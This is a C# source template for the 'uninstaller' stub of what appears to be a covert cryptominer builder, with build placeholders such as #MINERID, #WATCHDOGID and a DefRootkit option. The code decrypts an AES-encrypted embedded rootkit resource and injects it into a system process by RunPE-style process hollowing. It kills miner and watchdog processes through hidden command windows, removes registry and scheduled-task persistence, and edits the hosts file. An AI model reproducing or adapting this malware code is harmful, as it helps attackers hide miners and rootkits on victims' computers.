using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Resources;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Management;
#if DefDebug
using System.Windows.Forms;
#endif

public partial class _rUninstaller_
{
    public static string _rbD_ = Path.Combine(Environment.GetFolderPath($LIBSROOT), "#LIBSPATH");
    public static string _rbD2_ = Path.Combine(Environment.GetFolderPath($LIBSROOT), "#WATCHDOGPATH");


    public static void Main()
    {
#if DefRootkit
        try
        {
            using (var _rarchive_ = new ZipArchive(new MemoryStream(_rGetTheResource_("#RESRKU"))))
            {
                foreach (ZipArchiveEntry _rentry_ in _rarchive_.Entries)
                {
                    if (_rentry_.FullName.Contains("st"))
                    {
                        using (var _rstreamdata_ = _rentry_.Open())
                        {
                            using (var _rms_ = new MemoryStream())
                            {
                                _rstreamdata_.CopyTo(_rms_);
                                _rRun_(_rms_.ToArray(), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, "#CONHOST"), null);
                            }
                        }
                    }
                }
            }  
        }
        catch(Exception ex){
#if DefDebug
        MessageBox.Show("RK: " + ex.ToString());
#endif
        }
#endif

#if DefInstall
        try
        {
            foreach (Process proc in Process.GetProcessesByName("#WATCHDOGNAME"))
            {
                proc.Kill();
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U1: " + Environment.NewLine + ex.ToString());
#endif
        }

        try
        {
            _rCommand_("#SCMD", "#REGREM");

        }
        catch {}

        try
        {
            _rCommand_("#SCMD", "#TASKSCHREM");
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U3: " + Environment.NewLine + ex.ToString());
#endif
        }

#endif

        try
        {
            var _rarg1_ = new ConnectionOptions();
            _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
            var _rarg2_ = new ManagementScope("#WMISCOPE", _rarg1_);
            _rarg2_.Connect();

            var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("Select CommandLine, ProcessID from Win32_Process")).Get();
            foreach (ManagementObject MemObj in _rarg3_)
            {
                if (MemObj != null && MemObj["CommandLine"] != null && (MemObj["CommandLine"].ToString().Contains("#MINERID") || MemObj["CommandLine"].ToString().Contains("#WATCHDOGID")))
                {
                    _rCommand_("#SCMD", string.Format("#CMDKILL", MemObj["ProcessID"]));
                }
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U4: " + Environment.NewLine + ex.ToString());
#endif
        }

        Thread.Sleep(3000);
        try
        {
            Directory.Delete(_rbD_, true);
            Directory.Delete(_rbD2_, true);
#if DefInstall
            File.Delete(PayloadPath);
#endif
        }
        catch { }

#if DefBlockWebsites
        try
        {
            string _rhostspath_ = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "#HOSTSPATH");
            List<string> _rhostscontent_ = new List<string>(File.ReadAllLines(_rhostspath_));

            string[] _rdomainset_ = new string[] { DOMAINSET };
            for (int i = _rhostscontent_.Count - 1; i >= 0; i--)
            {
                foreach (string _set_ in _rdomainset_)
                {
                    if (_rhostscontent_[i].Contains(" " + _set_))
                    {
                        _rhostscontent_.RemoveAt(i);
                        break;
                    }
                }
            }
            File.WriteAllLines(_rhostspath_, _rhostscontent_.ToArray());
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("M0.5: " + Environment.NewLine + ex.ToString());
#endif
        }
#endif
        Environment.Exit(0);
    }

    public static string _rGetString_(string _rarg1_)
    {
        return Encoding.Unicode.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
    }

    public static byte[] _rAESMethod_(byte[] _rinput_, bool _rencrypt_ = false)
    {
        var _rkeybytes_ = new Rfc2898DeriveBytes(@"#AESKEY", Encoding.ASCII.GetBytes(@"#SALT"), 100).GetBytes(16);
        using (Aes _raesAlg_ = Aes.Create())
        {
            using (MemoryStream _rmsDecrypt_ = new MemoryStream())
            {
                using (CryptoStream _rcsDecrypt_ = new CryptoStream(_rmsDecrypt_, _rencrypt_ ? _raesAlg_.CreateEncryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")) : _raesAlg_.CreateDecryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")), CryptoStreamMode.Write))
                {
                    _rcsDecrypt_.Write(_rinput_, 0, _rinput_.Length);
                    _rcsDecrypt_.Close();
                }
                return _rmsDecrypt_.ToArray();
            }
        }
    }

    public static void _rCommand_(string _rarg1_, string _rarg2_)
    {
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = _rarg1_,
                Arguments = _rarg2_,
                WorkingDirectory = Environment.SystemDirectory,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
        }
        catch (Exception ex)
        {
#if DefDebug
                MessageBox.Show("M.C: " + Environment.NewLine + ex.ToString());
#endif
        }
    }

#if DefRootkit
    public static byte[] _rGetTheResource_(string _rarg1_)
    {
        var MyResource = new System.Resources.ResourceManager("#RESPARENT", Assembly.GetExecutingAssembly());
        return _rAESMethod_((byte[])MyResource.GetObject(_rarg1_));
    }
    
    public static void _rRun_(byte[] _rpayload_, string _rinjectionpath_, string _rarguments_)
    {
        Assembly.Load(_rGetTheResource_("#RESRPE")).GetType("#RUNPETYPE").GetMethod("#RUNPEMETHOD", BindingFlags.Public | BindingFlags.Static).Invoke(null, new object[] { _rpayload_, _rinjectionpath_, _rarguments_ });
    }
#endif
}